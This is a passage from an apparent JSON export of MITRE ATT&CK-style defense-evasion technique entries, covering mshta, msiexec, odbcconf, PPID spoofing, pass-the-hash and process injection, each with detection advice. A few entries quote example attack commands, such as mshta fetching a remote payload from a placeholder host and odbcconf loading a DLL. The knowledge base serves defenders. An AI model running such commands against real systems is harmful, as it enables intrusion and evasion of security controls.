Mshta","sort_id":0,"external_id":"T1218.005","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017) <\/p>\n<p>Mshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications)<\/p>\n<p>Files may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(&quot;GetObject(&quot;&quot;script:https[:]\/\/webserver\/payload[.]sct&quot;&quot;)&quot;))<\/code><\/p>\n<p>They may also be executed directly from URLs: <code>mshta http[:]\/\/webserver\/payload[.]hta<\/code><\/p>\n<p>Mshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. (Citation: LOLBAS Mshta)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Use process monitoring to monitor the execution and arguments of mshta.exe. Look for mshta.exe executing raw or obfuscated script within the command-line. Compare recent invocations of mshta.exe with prior history of known good arguments and executed .hta files to determine anomalous and potentially adversarial activity. Command arguments used before and after the mshta.exe invocation may also be useful in determining the origin and purpose of the .hta file being executed.\n\nMonitor use of HTA files. If they are not typically used within an environment then execution of them may be suspicious","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":668,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":669,"name":"T1218.007 - Msiexec","sort_id":0,"external_id":"T1218.007","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may abuse msiexec.exe to proxy execution of malicious payloads. Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi).(Citation: Microsoft msiexec) Msiexec.exe is digitally signed by Microsoft.<\/p>\n<p>Adversaries may abuse msiexec.exe to launch local or network accessible MSI files. Msiexec.exe can also execute DLLs.(Citation: LOLBAS Msiexec)(Citation: TrendMicro Msiexec Feb 2018) Since it is signed and native on Windows systems, msiexec.exe can be used to bypass application control solutions that do not account for its potential abuse.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Use process monitoring to monitor the execution and arguments of msiexec.exe. Compare recent invocations of msiexec.exe with prior history of known good arguments and executed MSI files or DLLs to determine anomalous and potentially adversarial activity. Command arguments used before and after the invocation of msiexec.exe may also be useful in determining the origin and purpose of the MSI files or DLLs being executed.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":669,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":672,"name":"T1564.004 - NTFS File Attributes","sort_id":0,"external_id":"T1564.004","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may use NTFS file attributes to hide their malicious data in order to evade detection. Every New Technology File System (NTFS) formatted partition contains a Master File Table (MFT) that maintains a record for every file\/directory on the partition. (Citation: SpectorOps Host-Based Jul 2017) Within MFT entries are file attributes, (Citation: Microsoft NTFS File Attributes Aug 2010) such as Extended Attributes (EA) and Data [known as Alternate Data Streams (ADSs) when more than one Data attribute is present], that can be used to store arbitrary data (and even complete files). (Citation: SpectorOps Host-Based Jul 2017) (Citation: Microsoft File Streams) (Citation: MalwareBytes ADS July 2015) (Citation: Microsoft ADS Mar 2014)<\/p>\n<p>Adversaries may store malicious data or binaries in file attribute metadata instead of directly in files. This may be done to evade some defenses, such as static indicator scanning tools and anti-virus. (Citation: Journey into IR ZeroAccess NTFS EA) (Citation: MalwareBytes ADS July 2015)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Forensic techniques exist to identify information stored in NTFS EA. (Citation: Journey into IR ZeroAccess NTFS EA) Monitor calls to the <code>ZwSetEaFile<\/code> and <code>ZwQueryEaFile<\/code> Windows API functions as well as binaries used to interact with EA, (Citation: Oddvar Moe ADS1 Jan 2018) (Citation: Oddvar Moe ADS2 Apr 2018) and consider regularly scanning for the presence of modified information. (Citation: SpectorOps Host-Based Jul 2017)\n\nThere are many ways to create and interact with ADSs using Windows utilities. Monitor for operations (execution, copies, etc.) with file names that contain colons. This syntax (ex: <code>file.ext:ads[.ext]<\/code>) is commonly associated with ADSs. (Citation: Microsoft ADS Mar 2014) (Citation: Oddvar Moe ADS1 Jan 2018) (Citation: Oddvar Moe ADS2 Apr 2018) For a more exhaustive list of utilities that can be used to execute and create ADSs, see https:\/\/gist.github.com\/api0cradle\/cdd2d0d0ec9abb686f0e89306e277b8f.\n\nThe Streams tool of Sysinternals can be used to uncover files with ADSs. The <code>dir \/r<\/code> command can also be used to display ADSs. (Citation: Symantec ADS May 2009) Many PowerShell commands (such as Get-Item, Set-Item, Remove-Item, and Get-ChildItem) can also accept a <code>-stream<\/code> parameter to interact with ADSs. (Citation: MalwareBytes ADS July 2015) (Citation: Microsoft ADS Mar 2014)","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":672,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":675,"name":"T1070.005 - Network Share Connection Removal","sort_id":0,"external_id":"T1070.005","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may remove share connections that are no longer useful in order to clean up traces of their operation. Windows shared drive and <a href=\"https:\/\/attack.mitre.org\/techniques\/T1077\">Windows Admin Shares<\/a> connections can be removed when no longer needed. <a href=\"https:\/\/attack.mitre.org\/software\/S0039\">Net<\/a> is an example utility that can be used to remove network share connections with the <code>net use \\system\\share \/delete<\/code> command. (Citation: Technet Net Use)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Network share connections may be common depending on how an network environment is used. Monitor command-line invocation of <code>net use<\/code> commands associated with establishing and removing remote shares over SMB, including following best practices for detection of [Windows Admin Shares](https:\/\/attack.mitre.org\/techniques\/T1077). SMB traffic between systems may also be captured and decoded to look for related network share session and file transfer activity. Windows authentication logs are also useful in determining when authenticated network shares are established and by which account, and can be used to correlate network share activity to other events to investigate potentially malicious activity.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":675,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":679,"name":"T1218.008 - Odbcconf","sort_id":0,"external_id":"T1218.008","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may abuse odbcconf.exe to proxy execution of malicious payloads. Odbcconf.exe is a Windows utility that allows you to configure Open Database Connectivity (ODBC) drivers and data source names.(Citation: Microsoft odbcconf.exe) Odbcconf.exe is digitally signed by Microsoft.<\/p>\n<p>Adversaries may abuse odbcconf.exe to bypass application control solutions that do not account for its potential abuse. Similar to <a href=\"https:\/\/attack.mitre.org\/techniques\/T1218\/010\">Regsvr32<\/a>, odbcconf.exe has a <code>REGSVR<\/code> flag that can be misused to execute DLLs (ex: <code>odbcconf.exe \/S \/A &lbrace;REGSVR &quot;C:\\Users\\Public\\file.dll&quot;&rbrace;<\/code>). (Citation: LOLBAS Odbcconf)(Citation: TrendMicro Squiblydoo Aug 2017)(Citation: TrendMicro Cobalt Group Nov 2017) <\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Use process monitoring to monitor the execution and arguments of odbcconf.exe. Compare recent invocations of odbcconf.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity. Command arguments used before and after the invocation of odbcconf.exe may also be useful in determining the origin and purpose of the DLL being loaded.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":679,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":686,"name":"T1134.004 - Parent PID Spoofing","sort_id":0,"external_id":"T1134.004","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges. New processes are typically spawned directly from their parent, or calling, process unless explicitly specified. One way of explicitly assigning the PPID of a new process is via the <code>CreateProcess<\/code> API call, which supports a parameter that defines the PPID to use.(Citation: DidierStevens SelectMyParent Nov 2009) This functionality is used by Windows features such as User Account Control (UAC) to correctly set the PPID after a requested elevated process is spawned by SYSTEM (typically via <code>svchost.exe<\/code> or <code>consent.exe<\/code>) rather than the current user context.(Citation: Microsoft UAC Nov 2018)<\/p>\n<p>Adversaries may abuse these mechanisms to evade defenses, such as those blocking processes spawning directly from Office documents, and analysis targeting unusual\/potentially malicious parent-child process relationships, such as spoofing the PPID of <a href=\"https:\/\/attack.mitre.org\/techniques\/T1086\">PowerShell<\/a>\/<a href=\"https:\/\/attack.mitre.org\/techniques\/T1085\">Rundll32<\/a> to be <code>explorer.exe<\/code> rather than an Office document delivered as part of <a href=\"https:\/\/attack.mitre.org\/techniques\/T1566\/001\">Spearphishing Attachment<\/a>.(Citation: CounterCept PPID Spoofing Dec 2018) This spoofing could be executed via <a href=\"https:\/\/attack.mitre.org\/techniques\/T1059\/005\">Visual Basic<\/a> within a malicious Office document or any code that can perform <a href=\"https:\/\/attack.mitre.org\/techniques\/T1106\">Native API<\/a>.(Citation: CTD PPID Spoofing Macro Mar 2019)(Citation: CounterCept PPID Spoofing Dec 2018)<\/p>\n<p>Explicitly assigning the PPID may also enable elevated privileges given appropriate access rights to the parent process. For example, an adversary in a privileged user context (i.e. administrator) may spawn a new process and assign the parent as a process running as SYSTEM (such as <code>lsass.exe<\/code>), causing the new process to be elevated via the inherited access token.(Citation: XPNSec PPID Nov 2017)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Look for inconsistencies between the various fields that store PPID information, such as the EventHeader ProcessId from data collected via Event Tracing for Windows (ETW), Creator Process ID\/Name from Windows event logs, and the ProcessID and ParentProcessID (which are also produced from ETW and other utilities such as Task Manager and Process Explorer). The ETW provided EventHeader ProcessId identifies the actual parent process.(Citation: CounterCept PPID Spoofing Dec 2018)\n\nMonitor and analyze API calls to <code>CreateProcess<\/code>\/<code>CreateProcessA<\/code>, specifically those from user\/potentially malicious processes and with parameters explicitly assigning PPIDs (ex: the Process Creation Flags of 0x8XXX, indicating that the process is being created with extended startup information(Citation: Microsoft Process Creation Flags May 2018)). Malicious use of <code>CreateProcess<\/code>\/<code>CreateProcessA<\/code> may also be proceeded by a call to <code>UpdateProcThreadAttribute<\/code>, which may be necessary to update process creation attributes.(Citation: Secuirtyinbits Ataware3 May 2019) This may generate false positives from normal UAC elevation behavior, so compare to a system baseline\/understanding of normal system activity if possible.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":686,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":687,"name":"T1550.002 - Pass the Hash","sort_id":0,"external_id":"T1550.002","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may \u201cpass the hash\u201d using stolen password hashes to move laterally within an environment, bypassing normal system access controls. Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash. In this technique, valid password hashes for the account being used are captured using a Credential Access technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems.<\/p>\n<p>Windows 7 and higher with KB2871997 require valid domain user credentials or RID 500 administrator hashes.(Citation: NSA Spotting)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Audit all logon and credential use events and review for discrepancies. Unusual remote logins that correlate with other suspicious activity (such as writing and executing binaries) may indicate malicious activity. NTLM LogonType 3 authentications that are not associated to a domain login and are not anonymous logins are suspicious.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":687,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":688,"name":"T1550.003 - Pass the Ticket","sort_id":0,"external_id":"T1550.003","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may \u201cpass the ticket\u201d using stolen Kerberos tickets to move laterally within an environment, bypassing normal system access controls. Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account's password. Kerberos authentication can be used as the first step to lateral movement to a remote system.<\/p>\n<p>In this technique, valid Kerberos tickets for <a href=\"https:\/\/attack.mitre.org\/techniques\/T1078\">Valid Accounts<\/a> are captured by <a href=\"https:\/\/attack.mitre.org\/techniques\/T1003\">OS Credential Dumping<\/a>. A user's service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access. A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access.(Citation: ADSecurity AD Kerberos Attacks)(Citation: GentilKiwi Pass the Ticket)<\/p>\n<p><a href=\"https:\/\/attack.mitre.org\/techniques\/T1558\/002\">Silver Ticket<\/a> can be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint).(Citation: ADSecurity AD Kerberos Attacks)<\/p>\n<p><a href=\"https:\/\/attack.mitre.org\/techniques\/T1558\/001\">Golden Ticket<\/a> can be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory.(Citation: Campbell 2014)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Audit all Kerberos authentication and credential use events and review for discrepancies. Unusual remote authentication events that correlate with other suspicious activity (such as writing and executing binaries) may indicate malicious activity.\n\nEvent ID 4769 is generated on the Domain Controller when using a golden ticket after the KRBTGT password has been reset twice, as mentioned in the mitigation section. The status code 0x1F indicates the action has failed due to \"Integrity check on decrypted field failed\" and indicates misuse by a previously invalidated golden ticket.(Citation: CERT-EU Golden Ticket Protection)","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":688,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":699,"name":"T1205.001 - Port Knocking","sort_id":0,"external_id":"T1205.001","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may use port knocking to hide open ports used for persistence or command and control. To enable a port, an adversary sends a series of attempted connections to a predefined sequence of closed ports. After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software.<\/p>\n<p>This technique has been observed to both for the dynamic opening of a listening port as well as the initiating of a connection to a listening server on a different system.<\/p>\n<p>The observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r (Citation: Hartrell cd00r 2002), is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Record network packets sent to and from the system, looking for extraneous packets that do not belong to established flows.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":699,"platform_id":1,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":699,"platform_id":2,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":699,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":701,"name":"T1055.002 - Portable Executable Injection","sort_id":0,"external_id":"T1055.002","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may inject portable executables (PE) into processes in order to evade process-based defenses as well as possibly elevate privileges. PE injection is a method of executing arbitrary code in the address space of a separate live process. <\/p>\n<p>PE injection is commonly performed by copying code (perhaps without a file on disk) into the virtual address space of the target process before invoking it via a new thread. The write can be performed with native Windows API calls such as <code>VirtualAllocEx<\/code> and <code>WriteProcessMemory<\/code>, then invoked with <code>CreateRemoteThread<\/code> or additional code (ex: shellcode). The displacement of the injected code does introduce the additional requirement for functionality to remap memory references. (Citation: Endgame Process Injection July 2017) <\/p>\n<p>Running code in the context of another process may allow access to the process's memory, system\/network resources, and possibly elevated privileges. Execution via PE injection may also evade detection from security products since the execution is masked under a legitimate process. <\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>CreateRemoteThread<\/code> and those that can be used to modify memory within another process, such as <code>VirtualAllocEx<\/code>\/<code>WriteProcessMemory<\/code>, may be used for this technique.(Citation: Endgame Process Injection July 2017)\n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. ","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":701,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":704,"name":"T1542 - Pre-OS Boot","sort_id":0,"external_id":"T1542","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may abuse Pre-OS Boot mechanisms as a way to establish persistence on a system. During the booting process of a computer, firmware and various startup services are loaded before the operating system. These programs control flow of execution before the operating system takes control.(Citation: Wikipedia Booting)<\/p>\n<p>Adversaries may overwrite data in boot drivers or firmware such as BIOS (Basic Input\/Output System) and The Unified Extensible Firmware Interface (UEFI) to persist on systems at a layer below the operating system. This can be particularly difficult to detect as malware at this level will not be detected by host software-based defenses.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Perform integrity checking on pre-OS boot mechanisms that can be manipulated for malicious purposes. Take snapshots of boot records and firmware and compare against known good images. Log changes to boot records, BIOS, and EFI, which can be performed by API calls, and compare against known good behavior and patching.\n\nDisk check, forensic utilities, and data from device drivers (i.e. processes and API calls) may reveal anomalies that warrant deeper investigation. (Citation: ITWorld Hard Disk Health Dec 2014)","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":704,"platform_id":1,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":704,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":707,"name":"T1055.009 - Proc Memory","sort_id":0,"external_id":"T1055.009","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may inject malicious code into processes via the \/proc filesystem in order to evade process-based defenses as well as possibly elevate privileges. Proc memory injection is a method of executing arbitrary code in the address space of a separate live process. <\/p>\n<p>Proc memory injection involves enumerating the memory of a process via the \/proc filesystem (<code>\/proc\/[pid]<\/code>) then crafting a return-oriented programming (ROP) payload with available gadgets\/instructions. Each running process has its own directory, which includes memory mappings. Proc memory injection is commonly performed by overwriting the target processes\u2019 stack using memory mappings provided by the \/proc filesystem. This information can be used to enumerate offsets (including the stack) and gadgets (or instructions within the program that can be used to build a malicious payload) otherwise hidden by process memory protections such as address space layout randomization (ASLR). Once enumerated, the target processes\u2019 memory map within <code>\/proc\/[pid]\/maps<\/code> can be overwritten using dd.(Citation: Uninformed Needle)(Citation: GDS Linux Injection)(Citation: DD Man) <\/p>\n<p>Other techniques such as <a href=\"https:\/\/attack.mitre.org\/techniques\/T1574\/006\">LD_PRELOAD<\/a> may be used to populate a target process with more available gadgets. Similar to <a href=\"https:\/\/attack.mitre.org\/techniques\/T1055\/012\">Process Hollowing<\/a>, proc memory injection may target child processes (such as a backgrounded copy of sleep).(Citation: GDS Linux Injection) <\/p>\n<p>Running code in the context of another process may allow access to the process's memory, system\/network resources, and possibly elevated privileges. Execution via proc memory injection may also evade detection from security products since the execution is masked under a legitimate process. <\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"File system monitoring can determine if \/proc files are being modified. Users should not have permission to modify these in most cases. \n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. ","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":707,"platform_id":1,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":708,"name":"T1055.013 - Process Doppelg\u00e4nging","sort_id":0,"external_id":"T1055.013","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may inject malicious code into process via process doppelg\u00e4nging in order to evade process-based defenses as well as possibly elevate privileges. Process doppelg\u00e4nging is a method of executing arbitrary code in the address space of a separate live process. <\/p>\n<p>Windows Transactional NTFS (TxF) was introduced in Vista as a method to perform safe file operations. (Citation: Microsoft TxF) To ensure data integrity, TxF enables only one transacted handle to write to a file at a given time. Until the write handle transaction is terminated, all other handles are isolated from the writer and may only read the committed version of the file that existed at the time the handle was opened. (Citation: Microsoft Basic TxF Concepts) To avoid corruption, TxF performs an automatic rollback if the system or application fails during a write transaction. (Citation: Microsoft Where to use TxF)<\/p>\n<p>Although deprecated, the TxF application programming interface (API) is still enabled as of Windows 10. (Citation: BlackHat Process Doppelg\u00e4nging Dec 2017)<\/p>\n<p>Adversaries may abuse TxF to a perform a file-less variation of <a href=\"https:\/\/attack.mitre.org\/techniques\/T1055\">Process Injection<\/a>. Similar to <a href=\"https:\/\/attack.mitre.org\/techniques\/T1093\">Process Hollowing<\/a>, process doppelg\u00e4nging involves replacing the memory of a legitimate process, enabling the veiled execution of malicious code that may evade defenses and detection. Process doppelg\u00e4nging's use of TxF also avoids the use of highly-monitored API functions such as <code>NtUnmapViewOfSection<\/code>, <code>VirtualProtectEx<\/code>, and <code>SetThreadContext<\/code>. (Citation: BlackHat Process Doppelg\u00e4nging Dec 2017)<\/p>\n<p>Process Doppelg\u00e4nging is implemented in 4 steps (Citation: BlackHat Process Doppelg\u00e4nging Dec 2017):<\/p>\n<ul>\n<li>Transact \u2013 Create a TxF transaction using a legitimate executable then overwrite the file with malicious code. These changes will be isolated and only visible within the context of the transaction.<\/li>\n<li>Load \u2013 Create a shared section of memory and load the malicious executable.<\/li>\n<li>Rollback \u2013 Undo changes to original executable, effectively removing malicious code from the file system.<\/li>\n<li>Animate \u2013 Create a process from the tainted section of memory and initiate execution.<\/li>\n<\/ul>\n<p>This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process doppelg\u00e4nging may evade detection from security products since the execution is masked under a legitimate process. <\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor and analyze calls to <code>CreateTransaction<\/code>, <code>CreateFileTransacted<\/code>, <code>RollbackTransaction<\/code>, and other rarely used functions indicative of TxF activity. Process Doppelg\u00e4nging also invokes an outdated and undocumented implementation of the Windows process loader via calls to <code>NtCreateProcessEx<\/code> and <code>NtCreateThreadEx<\/code> as well as API calls used to modify memory within another process, such as <code>WriteProcessMemory<\/code>. (Citation: BlackHat Process Doppelg\u00e4nging Dec 2017) (Citation: hasherezade Process Doppelg\u00e4nging Dec 2017)\n\nScan file objects reported during the PsSetCreateProcessNotifyRoutine, (Citation: Microsoft PsSetCreateProcessNotifyRoutine routine) which triggers a callback whenever a process is created or deleted, specifically looking for file objects with enabled write access. (Citation: BlackHat Process Doppelg\u00e4nging Dec 2017) Also consider comparing file objects loaded in memory to the corresponding file on disk. (Citation: hasherezade Process Doppelg\u00e4nging Dec 2017)\n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":708,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":709,"name":"T1055.012 - Process Hollowing","sort_id":0,"external_id":"T1055.012","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. Process hollowing is a method of executing arbitrary code in the address space of a separate live process.  <\/p>\n<p>Process hollowing is commonly performed by creating a process in a suspended state then unmapping\/hollowing its memory, which can then be replaced with malicious code. A victim process can be created with native Windows API calls such as <code>CreateProcess<\/code>, which includes a flag to suspend the processes primary thread. At this point the process can be unmapped using APIs calls such as <code>ZwUnmapViewOfSection<\/code> or <code>NtUnmapViewOfSection<\/code>  before being written to, realigned to the injected code, and resumed via <code>VirtualAllocEx<\/code>, <code>WriteProcessMemory<\/code>, <code>SetThreadContext<\/code>, then <code>ResumeThread<\/code> respectively.(Citation: Leitch Hollowing)(Citation: Endgame Process Injection July 2017)<\/p>\n<p>This is very similar to <a href=\"https:\/\/attack.mitre.org\/techniques\/T1055\/005\">Thread Local Storage<\/a> but creates a new process rather than targeting an existing process. This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process hollowing may also evade detection from security products since the execution is masked under a legitimate process. <\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>CreateRemoteThread<\/code>, <code>SuspendThread<\/code>\/<code>SetThreadContext<\/code>\/<code>ResumeThread<\/code>, and those that can be used to modify memory within another process, such as <code>VirtualAllocEx<\/code>\/<code>WriteProcessMemory<\/code>, may be used for this technique.(Citation: Endgame Process Injection July 2017)\n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. ","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 